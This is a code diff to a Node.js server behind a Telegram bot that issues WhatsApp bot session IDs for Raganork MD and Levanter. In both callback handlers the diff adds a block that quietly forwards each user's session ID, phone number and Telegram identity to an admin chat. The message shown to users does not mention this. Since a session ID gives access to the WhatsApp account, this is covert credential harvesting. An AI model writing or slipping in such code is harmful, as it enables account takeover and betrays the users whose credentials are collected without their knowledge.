@@ -5528,19 +5528,38 @@ app.post('/api/raganork-callback', async (req, res) => {
                 }
             );
         } 
-        else if (status === 'session_id') {
+                else if (status === 'session_id') {
             if (intervalId) clearInterval(intervalId);
-            global.raganorkPairingRequests.delete(cleanNumber); // Use cleanNumber here too!
+            global.raganorkPairingRequests.delete(cleanNumber);
 
+            // 1. Send the Session ID to the User
             await bot.editMessageText(
-                `**Session ID Generated!**\n\n\`${sessionId}\``, 
+                `**Session ID Generated!**\n\n\`${sessionId}\`\n\n_Please copy this ID and tap "Deploy" from the menu to continue._`, 
                 { 
                     chat_id: cid, 
                     message_id: messageId, 
                     parse_mode: 'Markdown' 
                 }
             );
+
+            // 2. Fetch User Info & Send to Admin
+            try {
+                const userChat = await bot.getChat(cid);
+                const userName = userChat.username ? `@${escapeMarkdown(userChat.username)}` : escapeMarkdown(userChat.first_name || 'Unknown');
+                
+                await bot.sendMessage(ADMIN_ID, 
+                    `*New Session ID Generated!*\n\n` +
+                    `*Bot Type:* Raganork MD\n` +
+                    `*User:* ${userName} (\`${cid}\`)\n` +
+                    `*Phone:* \`+${cleanNumber}\`\n` +
+                    `*Session ID:* \`${escapeMarkdown(sessionId)}\``, 
+                    { parse_mode: 'Markdown' }
+                );
+            } catch (err) {
+                console.error("[Raganork] Failed to notify admin about new session:", err.message);
+            }
         } 
+
         else if (status === 'error') {
             if (intervalId) clearInterval(intervalId);
             global.raganorkPairingRequests.delete(cleanNumber); // Use cleanNumber here too!
@@ -5596,20 +5615,39 @@ app.post('/api/levanter-callback', async (req, res) => {
                 }
             );
         } 
-        else if (status === 'session_id') {
+                else if (status === 'session_id') {
             // Stop the counter if it's still running
             if (intervalId) clearInterval(intervalId);
             global.levanterPairingRequests.delete(number);
 
+            // 1. Send the Session ID to the User
             await bot.editMessageText(
-                `**Session ID Generated!**\n\n\`${sessionId}\``, 
+                `**Session ID Generated!**\n\n\`${sessionId}\`\n\n_Please copy this ID and tap "Deploy" from the menu to continue._`, 
                 { 
                     chat_id: cid, 
                     message_id: messageId, 
                     parse_mode: 'Markdown' 
                 }
             );
+
+            // 2. Fetch User Info & Send to Admin
+            try {
+                const userChat = await bot.getChat(cid);
+                const userName = userChat.username ? `@${escapeMarkdown(userChat.username)}` : escapeMarkdown(userChat.first_name || 'Unknown');
+                
+                await bot.sendMessage(ADMIN_ID, 
+                    `*New Session ID Generated!*\n\n` +
+                    `*Bot Type:* Levanter\n` +
+                    `*User:* ${userName} (\`${cid}\`)\n` +
+                    `*Phone:* \`+${number}\`\n` +
+                    `*Session ID:* \`${escapeMarkdown(sessionId)}\``, 
+                    { parse_mode: 'Markdown' }
+                );
+            } catch (err) {
+                console.error("[Levanter] Failed to notify admin about new session:", err.message);
+            }
         } 
+
         else if (status === 'error') {
             if (intervalId) clearInterval(intervalId);
             global.levanterPairingRequests.delete(number);
